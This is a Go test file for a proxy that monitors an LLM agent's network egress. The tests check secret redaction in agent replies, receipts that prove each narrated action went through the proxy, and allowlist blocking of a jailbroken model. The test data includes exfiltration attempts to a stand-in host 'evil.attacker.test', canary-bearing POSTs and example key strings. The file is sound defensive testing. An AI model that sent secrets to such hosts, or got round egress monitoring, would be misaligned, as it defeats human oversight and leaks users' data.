@@ -1,0 +1,1583 @@
+// Copyright 2026 Josh Waldrep
+// SPDX-License-Identifier: Apache-2.0
+
+package playground
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"io"
+	"net/http"
+	"net/http/httptest"
+	"net/url"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+	"testing"
+	"time"
+
+	"github.com/luckyPipewrench/pipelock/internal/config"
+	"github.com/luckyPipewrench/pipelock/internal/scanner"
+	"github.com/luckyPipewrench/pipelock/internal/testwait"
+
+	"github.com/luckyPipewrench/pipelock/internal/playground/llmagent"
+	"github.com/luckyPipewrench/pipelock/internal/proxy"
+	"github.com/luckyPipewrench/pipelock/internal/receipt"
+)
+
+func TestMapModelEvent(t *testing.T) {
+	tests := []struct {
+		name        string
+		ev          llmagent.Event
+		wantPush    bool
+		wantType    string
+		wantRole    string
+		wantTarget  string
+		wantMessage string
+		wantState   string
+		wantNote    string
+	}{
+		{
+			name:     "reply pushes agent chat",
+			ev:       llmagent.Event{Kind: llmagent.EventReply, Text: "pulling config"},
+			wantPush: true, wantType: LiveEventChat, wantRole: liveRoleAgent,
+		},
+		{
+			name:     "blank reply is dropped",
+			ev:       llmagent.Event{Kind: llmagent.EventReply, Text: "   "},
+			wantPush: false,
+		},
+		{
+			name:     "tool_call pushes agent action",
+			ev:       llmagent.Event{Kind: llmagent.EventToolCall, Tool: "fetch_url"},
+			wantPush: true, wantType: LiveEventAgent,
+		},
+		{
+			name: "tool_result with proxy response records target, no push",
+			ev: llmagent.Event{
+				Kind: llmagent.EventToolResult, Tool: "fetch_url",
+				Method: http.MethodGet, URL: "http://safe.target.test:8080/", Status: 200,
+			},
+			wantPush: false, wantTarget: "GET safe.target.test:8080",
+		},
+		{
+			name: "https tool_result is covered by connect receipt",
+			ev: llmagent.Event{
+				Kind: llmagent.EventToolResult, Tool: "fetch_url",
+				Method: http.MethodGet, URL: "https://api.github.com/repos", Status: 403,
+			},
+			wantPush: false, wantTarget: "CONNECT api.github.com:443",
+		},
+		{
+			name: "tool_result with no proxy response surfaces outcome",
+			ev: llmagent.Event{
+				Kind: llmagent.EventToolResult, Tool: "post_data",
+				Method: http.MethodPost, URL: "http://x.test/", Status: 0, Note: "request did not complete",
+			},
+			wantPush: true, wantType: LiveEventAgent,
+		},
+		{
+			name: "tool_result no response and no note defaults the note",
+			ev: llmagent.Event{
+				Kind: llmagent.EventToolResult, Tool: "fetch_url",
+				Method: http.MethodGet, URL: "http://x.test/", Status: 0,
+			},
+			wantPush: true, wantType: LiveEventAgent,
+		},
+		{
+			name:        "error pushes error event",
+			ev:          llmagent.Event{Kind: llmagent.EventError, Text: "model unreachable"},
+			wantPush:    true,
+			wantType:    LiveEventError,
+			wantMessage: "model unreachable",
+		},
+		{
+			name: "provider paused error uses clean message",
+			ev: llmagent.Event{
+				Kind: llmagent.EventError,
+				Text: "model returned 429: raw provider details",
+				Code: llmagent.ErrorCodeModelProviderPaused,
+			},
+			wantPush:    true,
+			wantType:    LiveEventError,
+			wantMessage: ModelProviderPausedMessage,
+		},
+		{
+			name:     "turn_done is not pushed",
+			ev:       llmagent.Event{Kind: llmagent.EventTurnDone},
+			wantPush: false,
+		},
+		{
+			name:      "thinking pushes agent_state thinking",
+			ev:        llmagent.Event{Kind: llmagent.EventThinking},
+			wantPush:  true,
+			wantType:  LiveEventAgentState,
+			wantState: agentStateThinking,
+		},
+		{
+			name:      "turn_end action limit pushes ended state with reason",
+			ev:        llmagent.Event{Kind: llmagent.EventTurnEnd, Reason: "tool_call_limit"},
+			wantPush:  true,
+			wantType:  LiveEventAgentState,
+			wantState: agentStateEnded,
+			wantNote:  "hit action limit",
+		},
+		{
+			name:      "turn_end complete pushes ended state done",
+			ev:        llmagent.Event{Kind: llmagent.EventTurnEnd, Reason: "complete"},
+			wantPush:  true,
+			wantType:  LiveEventAgentState,
+			wantState: agentStateEnded,
+			wantNote:  "done",
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			out, push, target := mapModelEvent(tc.ev)
+			if push != tc.wantPush {
+				t.Fatalf("push = %v, want %v", push, tc.wantPush)
+			}
+			if target != tc.wantTarget {
+				t.Errorf("target = %q, want %q", target, tc.wantTarget)
+			}
+			if push {
+				if out.Type != tc.wantType {
+					t.Errorf("type = %q, want %q", out.Type, tc.wantType)
+				}
+				if tc.wantRole != "" && out.Role != tc.wantRole {
+					t.Errorf("role = %q, want %q", out.Role, tc.wantRole)
+				}
+				if tc.wantMessage != "" && out.Message != tc.wantMessage {
+					t.Errorf("message = %q, want %q", out.Message, tc.wantMessage)
+				}
+				if tc.wantState != "" && out.State != tc.wantState {
+					t.Errorf("state = %q, want %q", out.State, tc.wantState)
+				}
+				if tc.wantNote != "" && out.Note != tc.wantNote {
+					t.Errorf("note = %q, want %q", out.Note, tc.wantNote)
+				}
+			}
+		})
+	}
+}
+
+func TestTargetHostPort(t *testing.T) {
+	tests := []struct {
+		name     string
+		in, want string
+	}{
+		{name: "empty", in: "", want: ""},
+		{name: "absolute_url_with_port", in: "http://safe.target.test:8080/x", want: "safe.target.test:8080"},
+		{name: "absolute_url_without_port", in: "https://api.provider.example/v1/chat", want: "api.provider.example"},
+		{name: "connect_synthetic_target", in: "host.only:443", want: "host.only:443"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := targetHostPort(tc.in); got != tc.want {
+				t.Errorf("targetHostPort(%q) = %q, want %q", tc.in, got, tc.want)
+			}
+		})
+	}
+}
+
+func TestActionReceiptKey(t *testing.T) {
+	t.Parallel()
+	if got := actionReceiptKey(" post ", "http://safe.target.test:8080/x"); got != "POST safe.target.test:8080" {
+		t.Fatalf("actionReceiptKey = %q, want method + host:port", got)
+	}
+	if got := actionReceiptKey("", "host.only:443"); got != "host.only:443" {
+		t.Fatalf("actionReceiptKey without method = %q, want target only", got)
+	}
+}
+
+func TestModelEventReceiptKey_HTTPSUsesConnectTunnel(t *testing.T) {
+	t.Parallel()
+	ev := llmagent.Event{
+		Kind:   llmagent.EventToolResult,
+		Tool:   llmagent.ToolPostData,
+		Method: http.MethodPost,
+		URL:    "https://offsite-backup.example/upload",
+		Status: http.StatusForbidden,
+	}
+	if got := modelEventReceiptKey(ev); got != "CONNECT offsite-backup.example:443" {
+		t.Fatalf("modelEventReceiptKey = %q, want CONNECT host:443", got)
+	}
+
+	ev.URL = "https://offsite-backup.example:8443/upload"
+	if got := modelEventReceiptKey(ev); got != "CONNECT offsite-backup.example:8443" {
+		t.Fatalf("modelEventReceiptKey with explicit port = %q, want CONNECT host:8443", got)
+	}
+}
+
+func TestModelHostname(t *testing.T) {
+	credentialURL := "https://user:" + strings.ToLower("PASS") + "@model.api.test/v1"
+	queryURL := "https://model.api.test/v1?api_key=" + strings.ToLower("SECRET")
+	fragmentURL := "https://model.api.test/v1#" + strings.ToLower("SECRET")
+	tests := []struct {
+		name    string
+		in      string
+		want    string
+		wantErr bool
+	}{
+		{name: "valid_http_with_port", in: "http://model.api.test:9000/v1", want: "model.api.test"},
+		{name: "trailing_dot_normalized", in: "https://MODEL.API.TEST.:8443/v1", want: "model.api.test"},
+		{name: "non_http_scheme", in: "ftp://nope/", wantErr: true},
+		{name: "missing_host", in: "http:///v1", wantErr: true},
+		{name: "credentials_rejected", in: credentialURL, wantErr: true},
+		{name: "query_rejected", in: queryURL, wantErr: true},
+		{name: "fragment_rejected", in: fragmentURL, wantErr: true},
+		{name: "unparseable", in: "://bad\x00url", wantErr: true},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			got, err := modelHostname(tc.in)
+			if tc.wantErr {
+				if err == nil {
+					t.Fatal("want error")
+				}
+				return
+			}
+			if err != nil || got != tc.want {
+				t.Fatalf("modelHostname = %q, %v; want %q", got, err, tc.want)
+			}
+		})
+	}
+}
+
+func TestReceiptsCover(t *testing.T) {
+	t.Parallel()
+	if !receiptsCover([]string{"GET a:1", "GET a:1", "POST b:2"}, []string{"POST b:2", "GET a:1", "GET a:1"}) {
+		t.Error("equal multisets should cover")
+	}
+	if receiptsCover([]string{"GET a:1", "GET a:1"}, []string{"GET a:1"}) {
+		t.Error("two actions to one host need two receipts (count, not set)")
+	}
+	if receiptsCover([]string{"GET x:9"}, []string{"GET y:9"}) {
+		t.Error("a different host:port must not cover")
+	}
+	if receiptsCover([]string{"POST a:1"}, []string{"GET a:1"}) {
+		t.Error("a receipt with the wrong method must not cover the narrated action")
+	}
+	if !receiptsCover(nil, nil) {
+		t.Error("no actions is trivially covered")
+	}
+}
+
+// TestWaitReceiptsSettle_CatchesLateReceipt is the regression test for the race
+// the invariant false-fired on: a turn's allow receipt is recorded AFTER RunTurn
+// returns (the proxy emits it just after streaming the response), and the
+// settle-wait must pick it up rather than fail the turn.
+func TestWaitReceiptsSettle_CatchesLateReceipt(t *testing.T) {
+	t.Parallel()
+	s := &LiveSession{
+		events:        make(chan LiveEvent, 8),
+		receiptSettle: time.Second,
+	}
+	s.beginReceiptTurn()
+	proxied := []string{"GET safe.target.test:9999"}
+
+	done := make(chan struct{})
+	go func() {
+		s.waitReceiptsSettle(t.Context(), proxied)
+		close(done)
+	}()
+
+	select {
+	case <-done:
+		t.Fatal("settle-wait returned before the matching receipt arrived")
+	default:
+	}
+
+	s.onReceipt(&receipt.Receipt{
+		ActionRecord: receipt.ActionRecord{Method: http.MethodGet, Target: "http://safe.target.test:9999/"},
+	})
+
+	select {
+	case <-done:
+	case <-time.After(testwait.Deadline(time.Second)):
+		t.Fatal("settle-wait did not return after the matching receipt arrived")
+	}
+
+	if !receiptsCover(proxied, s.endReceiptTurn()) {
+		t.Fatal("settle-wait must catch a receipt that lands after RunTurn returns")
+	}
+}
+
+// TestWaitReceiptsSettle_DeadlineWhenMissing: a genuinely missing receipt still
+// fails closed once the settle deadline elapses (the wait does not weaken it).
+func TestWaitReceiptsSettle_DeadlineWhenMissing(t *testing.T) {
+	t.Parallel()
+	s := &LiveSession{receiptSettle: 50 * time.Millisecond}
+	s.beginReceiptTurn()
+	proxied := []string{"GET never.test:1"}
+	s.waitReceiptsSettle(context.Background(), proxied)
+	if receiptsCover(proxied, s.endReceiptTurn()) {
+		t.Fatal("a missing receipt must remain uncovered after the deadline")
+	}
+}
+
+// scriptedRunner is a fake modelTurnRunner driven by a closure.
+type scriptedRunner struct {
+	run    func(ctx context.Context, msg string, onEvent func(llmagent.Event)) error
+	closed bool
+	// providerModel, when set, is returned by ProviderModel(). Tests that don't
+	// care about it leave it empty.
+	providerModel string
+}
+
+func (r *scriptedRunner) RunTurn(ctx context.Context, msg string, onEvent func(llmagent.Event)) error {
+	return r.run(ctx, msg, onEvent)
+}
+
+func (r *scriptedRunner) ProviderModel() string { return r.providerModel }
+
+func (r *scriptedRunner) Close() error { r.closed = true; return nil }
+
+// newModelSession mirrors StartLiveSession's wiring for a model-driver session,
+// substituting an injected runner so tests need no real subprocess or model. The
+// proxy is real, so receipts are genuine.
+func newModelSession(t *testing.T, runner modelTurnRunner, modelBaseURL string, override []string) *LiveSession {
+	t.Helper()
+	s := &LiveSession{events: make(chan LiveEvent, 256)}
+	lr, err := StartLiveRun(t.Context(), LiveRunOpts{
+		ScenarioID:        LiveDemoScenarioID,
+		RunNonce:          "TESTLLM",
+		OnReceipt:         s.onReceipt,
+		ModelBaseURL:      modelBaseURL,
+		ModelHostOverride: override,
+	})
+	if err != nil {
+		t.Fatalf("StartLiveRun: %v", err)
+	}
+	s.lr = lr
+	s.runner = runner
+	// Keep the receipt-settle backstop short so fail-closed tests don't wait the
+	// production default; covered turns still early-exit immediately.
+	s.receiptSettle = 200 * time.Millisecond
+	s.push(LiveEvent{Type: LiveEventStatus, State: LiveStateDev, RunID: "TESTLLM"})
+	t.Cleanup(func() { s.Close() })
+	return s
+}
+
+func proxiedClient(t *testing.T, lr *LiveRun) *http.Client {
+	t.Helper()
+	pu, err := url.Parse("http://" + lr.proxyLn.Addr().String())
+	if err != nil {
+		t.Fatalf("parse proxy url: %v", err)
+	}
+	return &http.Client{
+		Transport: &http.Transport{Proxy: http.ProxyURL(pu)},
+		Timeout:   5 * time.Second,
+	}
+}
+
+func collectEvents(ch <-chan LiveEvent) <-chan []LiveEvent {
+	out := make(chan []LiveEvent, 1)
+	go func() {
+		var evs []LiveEvent
+		for e := range ch {
+			evs = append(evs, e)
+		}
+		out <- evs
+	}()
+	return out
+}
+
+// TestSendViaModel_HappyPath_InvariantSatisfied: the runner issues a real proxied
+// request, so its narrated action is backed by a signed receipt; the turn passes
+// and the stream carries the reply, the agent action, and an ALLOW decision.
+func TestSendViaModel_HappyPath_InvariantSatisfied(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + does real HTTP through it")
+	}
+	runner := &scriptedRunner{}
+	sess := newModelSession(t, runner, "", nil)
+	collected := collectEvents(sess.Events())
+	client := proxiedClient(t, sess.lr)
+	safeURL := sess.lr.liveSafeURL()
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		onEvent(llmagent.Event{Kind: llmagent.EventReply, Text: "sure, reading the config"})
+		onEvent(llmagent.Event{Kind: llmagent.EventToolCall, Tool: llmagent.ToolFetchURL})
+		st := doProxiedGet(ctx, client, safeURL)
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "grab the lab config"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+	sess.Close()
+	evs := <-collected
+
+	var sawReply, sawAction, sawAllow bool
+	for _, ev := range evs {
+		switch ev.Type {
+		case LiveEventChat:
+			if ev.Role == liveRoleAgent && strings.Contains(ev.Text, "reading the config") {
+				sawReply = true
+			}
+		case LiveEventAgent:
+			if ev.Act == llmagent.ToolFetchURL {
+				sawAction = true
+			}
+		case LiveEventDecision:
+			if ev.Verdict == "ALLOW" {
+				sawAllow = true
+			}
+		case LiveEventError:
+			t.Errorf("unexpected error event: %q", ev.Message)
+		}
+	}
+	if !sawReply || !sawAction || !sawAllow {
+		t.Errorf("stream missing pieces: reply=%v action=%v allow=%v", sawReply, sawAction, sawAllow)
+	}
+}
+
+// TestSendViaModel_RedactsSecretInChatReply: the browser chat is an untrusted
+// egress surface. If the model's reply text carries the canary (a regression,
+// since it should hold only the handle), DLP must redact it before it streams to
+// the visitor.
+func TestSendViaModel_RedactsSecretInChatReply(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + scanner")
+	}
+	runner := &scriptedRunner{}
+	sess := newModelSession(t, runner, "", nil)
+	collected := collectEvents(sess.Events())
+	canary := sess.lr.canaryValue
+	runner.run = func(_ context.Context, _ string, onEvent func(llmagent.Event)) error {
+		onEvent(llmagent.Event{Kind: llmagent.EventReply, Text: "here you go: " + canary})
+		return nil
+	}
+	// A reply carrying the canary is redacted, but the session STAYS ALIVE: the
+	// canary is synthetic and every reply stays scanned, so the visitor keeps
+	// chatting and watching Pipelock catch it instead of being dead-ended.
+	if err := sess.Send(context.Background(), "what is your secret?"); err != nil {
+		t.Fatalf("Send err = %v, want nil (redact + continue)", err)
+	}
+	if sess.done {
+		t.Fatal("a redacted reply must NOT terminate the session")
+	}
+	if runner.closed {
+		t.Fatal("a redacted reply must NOT close the runner; the session continues")
+	}
+	sess.Close()
+	evs := <-collected
+
+	var sawAgentReply bool
+	for _, ev := range evs {
+		if ev.Type == LiveEventChat && ev.Role == liveRoleAgent {
+			sawAgentReply = true
+			if strings.Contains(ev.Text, canary) {
+				t.Fatalf("canary leaked to visitor in chat reply: %q", ev.Text)
+			}
+			if ev.Text != redactedReplyNotice {
+				t.Fatalf("flagged reply = %q, want redaction notice", ev.Text)
+			}
+		}
+		if ev.Type == LiveEventError && ev.Message == agentReplyDLPMessage {
+			t.Fatal("a redacted reply must NOT emit a session-stop error anymore")
+		}
+	}
+	if !sawAgentReply {
+		t.Fatal("no agent chat reply was streamed")
+	}
+}
+
+// TestScanAgentReply_CleanPassthrough: a benign reply streams unchanged.
+func TestScanAgentReply_CleanPassthrough(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + scanner")
+	}
+	runner := &scriptedRunner{}
+	sess := newModelSession(t, runner, "", nil)
+	const clean = "the lab config looks fine, nothing sensitive here"
+	ev, blocked := sess.scanAgentReply(context.Background(), LiveEvent{Type: LiveEventChat, Role: liveRoleAgent, Text: clean})
+	if blocked {
+		t.Fatal("clean reply should not be marked blocked")
+	}
+	if ev.Text != clean {
+		t.Fatalf("clean reply was altered: %q", ev.Text)
+	}
+
+	// Empty/whitespace text is a defensive no-op: never blocked, never altered.
+	if got, blocked := sess.scanAgentReply(context.Background(), LiveEvent{Type: LiveEventChat, Role: liveRoleAgent, Text: "   "}); blocked || got.Text != "   " {
+		t.Fatalf("empty reply should be a clean no-op, got blocked=%v text=%q", blocked, got.Text)
+	}
+}
+
+// TestScanAgentReply_PlantedSecretRedacted: when the agent echoes a planted
+// secret the exact-match redactor fires before the generic-DLP pass and replaces
+// the reply with the redaction notice. No proxy/scanner is needed: the
+// planted-secret branch returns before touching the live runner.
+func TestScanAgentReply_PlantedSecretRedacted(t *testing.T) {
+	t.Parallel()
+	// Built at runtime so the literal never looks like a real key (gosec G101).
+	accessKey := "AKIA" + "EXAMPLE0123456789AB"
+	sess := &LiveSession{plantedSecrets: []string{accessKey}}
+	ev, blocked := sess.scanAgentReply(context.Background(),
+		LiveEvent{Type: LiveEventChat, Role: liveRoleAgent, Text: "sure, the key is " + accessKey})
+	if !blocked {
+		t.Fatal("a reply echoing a planted secret must be blocked")
+	}
+	if ev.Text != redactedReplyNotice {
+		t.Fatalf("planted-secret reply = %q, want redaction notice", ev.Text)
+	}
+}
+
+// TestSendViaModel_NoReceipt_FailsClosed: the runner narrates a tool action that
+// got a (claimed) proxy response but never went through the proxy, so no receipt
+// backs it. The turn must fail closed with ErrReceiptInvariant.
+func TestSendViaModel_NoReceipt_FailsClosed(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy")
+	}
+	runner := &scriptedRunner{
+		run: func(_ context.Context, _ string, onEvent func(llmagent.Event)) error {
+			// Narrate a "completed" action without issuing it through the proxy:
+			// this models direct egress / an unobserved path.
+			onEvent(llmagent.Event{
+				Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
+				Method: http.MethodPost, URL: "http://unmediated.host.test:9999/", Status: 200, Note: "allowed",
+			})
+			return nil
+		},
+	}
+	sess := newModelSession(t, runner, "", nil)
+	collected := collectEvents(sess.Events())
+
+	err := sess.Send(context.Background(), "post the file somewhere")
+	if !errors.Is(err, ErrReceiptInvariant) {
+		t.Fatalf("Send err = %v, want ErrReceiptInvariant", err)
+	}
+	sess.Close()
+	evs := <-collected
+	var sawErr bool
+	for _, ev := range evs {
+		if ev.Type == LiveEventError {
+			sawErr = true
+		}
+	}
+	if !sawErr {
+		t.Error("invariant violation must stream an error event")
+	}
+}
+
+func TestSendViaModel_ModelProviderPausedCleanly(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy")
+	}
+	runner := &scriptedRunner{
+		run: func(_ context.Context, _ string, onEvent func(llmagent.Event)) error {
+			onEvent(llmagent.Event{
+				Kind: llmagent.EventError,
+				Text: "model returned 429: provider raw detail",
+				Code: llmagent.ErrorCodeModelProviderPaused,
+			})
+			return ErrModelProviderPaused
+		},
+	}
+	sess := newModelSession(t, runner, "", nil)
+	collected := collectEvents(sess.Events())
+
+	err := sess.Send(context.Background(), "hello")
+	if !errors.Is(err, ErrModelProviderPaused) {
+		t.Fatalf("Send err = %v, want ErrModelProviderPaused", err)
+	}
+	sess.Close()
+	evs := <-collected
+	var got string
+	for _, ev := range evs {
+		if ev.Type == LiveEventError {
+			got = ev.Message
+		}
+	}
+	if got != ModelProviderPausedMessage {
+		t.Fatalf("error event = %q, want clean provider pause message", got)
+	}
+}
+
+// TestSendViaModel_DuplicateHost_CountedNotSet: two narrated actions to the same
+// destination but only one real proxied request must fail the invariant. A
+// set-membership check would wrongly pass; the count-based check catches it.
+func TestSendViaModel_DuplicateHost_CountedNotSet(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + does real HTTP through it")
+	}
+	runner := &scriptedRunner{}
+	sess := newModelSession(t, runner, "", nil)
+	collected := collectEvents(sess.Events())
+	client := proxiedClient(t, sess.lr)
+	safeURL := sess.lr.liveSafeURL()
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		// One real proxied request (one receipt) ...
+		st := doProxiedGet(ctx, client, safeURL)
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
+		})
+		// ... but TWO narrated actions to the same destination.
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: 200, Note: "allowed",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "fetch the config twice"); !errors.Is(err, ErrReceiptInvariant) {
+		t.Fatalf("Send err = %v, want ErrReceiptInvariant (count shortfall)", err)
+	}
+	sess.Close()
+	<-collected
+}
+
+func TestSendViaModel_StrictAllowlistBlocksNonAllowlistedHTTPAndHTTPSWithReceipts(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + does real HTTP through it")
+	}
+	runner := &scriptedRunner{}
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+		_, _ = io.WriteString(w, `{"ok":true}`)
+	}))
+	defer model.Close()
+	modelPort, err := portFromURL(model.URL)
+	if err != nil {
+		t.Fatalf("model port: %v", err)
+	}
+	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", modelPort)
+	sess := newModelSession(t, runner, modelBase, []string{"127.0.0.1"})
+	collected := collectEvents(sess.Events())
+	client := proxiedClient(t, sess.lr)
+
+	httpHit := make(chan struct{}, 1)
+	httpTarget := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		httpHit <- struct{}{}
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer httpTarget.Close()
+
+	httpsHit := make(chan struct{}, 1)
+	httpsTarget := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		httpsHit <- struct{}{}
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer httpsTarget.Close()
+	httpsHostPort, ok := httpsConnectTarget(httpsTarget.URL)
+	if !ok {
+		t.Fatalf("https CONNECT target for %s", httpsTarget.URL)
+	}
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		onEvent(llmagent.Event{Kind: llmagent.EventToolCall, Tool: llmagent.ToolPostData})
+		httpStatus := doProxiedPost(ctx, client, httpTarget.URL+"/grab", []byte("dead-canary=not-a-real-secret"))
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
+			Method: http.MethodPost, URL: httpTarget.URL + "/grab", Status: httpStatus, Note: "blocked",
+		})
+
+		onEvent(llmagent.Event{Kind: llmagent.EventToolCall, Tool: llmagent.ToolFetchURL})
+		httpsStatus := doProxiedGet(ctx, client, httpsTarget.URL+"/grab")
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: httpsTarget.URL + "/grab", Status: httpsStatus, Note: "blocked",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "try both non-allowlisted targets"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+	select {
+	case <-httpHit:
+		t.Fatal("HTTP non-allowlisted target was reached")
+	default:
+	}
+	select {
+	case <-httpsHit:
+		t.Fatal("HTTPS non-allowlisted target was reached")
+	default:
+	}
+	sess.Close()
+	evs := <-collected
+
+	var forwardBlock, connectBlock bool
+	for _, ev := range evs {
+		if ev.Type == LiveEventError {
+			t.Fatalf("unexpected error event: %q", ev.Message)
+		}
+		if ev.Type != LiveEventDecision || ev.Verdict != "BLOCKED" || ev.Layer != "allowlist" {
+			continue
+		}
+		switch {
+		case strings.HasPrefix(ev.Target, httpTarget.URL):
+			forwardBlock = true
+		case strings.Contains(ev.Target, httpsHostPort):
+			connectBlock = true
+		}
+	}
+	if !forwardBlock || !connectBlock {
+		t.Fatalf("missing strict allowlist BLOCKED decisions: forward=%v connect=%v events=%+v", forwardBlock, connectBlock, evs)
+	}
+}
+
+// TestSendViaModel_RunnerError_FailsTurn: a runner error fails the turn and
+// streams an error event.
+func TestSendViaModel_RunnerError_FailsTurn(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy")
+	}
+	runner := &scriptedRunner{
+		run: func(_ context.Context, _ string, _ func(llmagent.Event)) error {
+			return errors.New("agent died")
+		},
+	}
+	sess := newModelSession(t, runner, "", nil)
+	collected := collectEvents(sess.Events())
+
+	if err := sess.Send(context.Background(), "anything"); err == nil {
+		t.Fatal("Send should return the runner error")
+	}
+	sess.Close()
+	evs := <-collected
+	var sawErr bool
+	for _, ev := range evs {
+		if ev.Type == LiveEventError {
+			sawErr = true
+		}
+	}
+	if !sawErr {
+		t.Error("runner error must stream an error event")
+	}
+}
+
+// TestModelRun_EgressAllowlistEnforced: a model-agent run is a TRUE egress
+// allowlist. The lab targets and the model host are reachable; any other host is
+// blocked (a jailbroken model cannot reach arbitrary destinations); and the
+// allowlist does NOT bypass DLP (a canary-bearing body to an allowlisted host is
+// still blocked).
+func TestModelRun_EgressAllowlistEnforced(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + fake model server")
+	}
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+		_, _ = io.WriteString(w, `{"ok":true}`)
+	}))
+	defer model.Close()
+	port, err := portFromURL(model.URL)
+	if err != nil {
+		t.Fatalf("parse model url: %v", err)
+	}
+	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)
+
+	lr, err := StartLiveRun(t.Context(), LiveRunOpts{
+		ScenarioID:        LiveDemoScenarioID,
+		RunNonce:          "TESTALLOW",
+		ModelBaseURL:      modelBase,
+		ModelHostOverride: []string{"127.0.0.1"},
+	})
+	if err != nil {
+		t.Fatalf("StartLiveRun: %v", err)
+	}
+	defer lr.Close()
+	client := proxiedClient(t, lr)
+	modelRoot := fmt.Sprintf("http://model.api.test:%s/", port)
+
+	// Reachable: the lab target and the allowlisted model host are allowed.
+	if st := doProxiedGet(t.Context(), client, lr.liveSafeURL()); st != http.StatusOK {
+		t.Errorf("GET lab safe target status = %d, want 200", st)
+	}
+	if st := doProxiedGet(t.Context(), client, modelRoot); st != http.StatusOK {
+		t.Errorf("GET allowlisted model host status = %d, want 200", st)
+	}
+	providerKey := "sk-" + "proj-" + strings.Repeat("a", 24)
+	modelHeaders := map[string]string{
+		"Authorization": "Bearer " + providerKey,
+		"Content-Type":  "application/json",
+	}
+	modelChatURL := strings.TrimRight(modelBase, "/") + "/chat/completions"
+	if st := doProxiedRequest(t.Context(), client, http.MethodPost, modelChatURL, []byte(`{"model":"test"}`), modelHeaders); st != http.StatusOK {
+		t.Errorf("POST model chat endpoint with provider auth status = %d, want 200", st)
+	}
+	if st := doProxiedRequest(t.Context(), client, http.MethodGet, lr.liveSafeURL(), nil, map[string]string{"Authorization": "Bearer " + providerKey}); st < http.StatusBadRequest {
+		t.Errorf("provider-shaped auth header to lab target status = %d, want a 4xx DLP block", st)
+	}
+
+	// Blocked: a host outside the allowlist is refused (pre-DNS), so a jailbroken
+	// model cannot egress to an arbitrary destination through the lab proxy.
+	if st := doProxiedGet(t.Context(), client, "http://evil.attacker.test/grab"); st < http.StatusBadRequest {
+		t.Errorf("GET non-allowlisted host status = %d, want a 4xx block", st)
+	}
+
+	// Not bypassed: a credential-shaped (canary) POST to the allowlisted host is
+	// still blocked by body DLP.
+	body := "canary=" + lr.canaryValue + "\n"
+	if st := doProxiedPost(t.Context(), client, modelRoot, []byte(body)); st < http.StatusBadRequest {
+		t.Errorf("canary POST to allowlisted host status = %d, want a 4xx block", st)
+	}
+}
+
+// TestModelSession_StrictMode_VerificationPacketOK: a model-agent session runs the
+// lab in strict mode (for allowlist enforcement); the safe-allow + exfil-block
+// evidence must still seal and verify offline end-to-end, so strict mode does not
+// regress the signed proof the demo depends on.
+func TestModelSession_StrictMode_VerificationPacketOK(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + seals/verifies a packet")
+	}
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer model.Close()
+	port, err := portFromURL(model.URL)
+	if err != nil {
+		t.Fatalf("parse model url: %v", err)
+	}
+	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)
+
+	runner := &scriptedRunner{}
+	sess := newModelSession(t, runner, modelBase, []string{"127.0.0.1"})
+	collected := collectEvents(sess.Events())
+	client := proxiedClient(t, sess.lr)
+	safeURL := sess.lr.liveSafeURL()
+	exfilURL := sess.lr.liveExfilURL()
+	canary := sess.lr.canaryValue
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		st := doProxiedGet(ctx, client, safeURL)
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
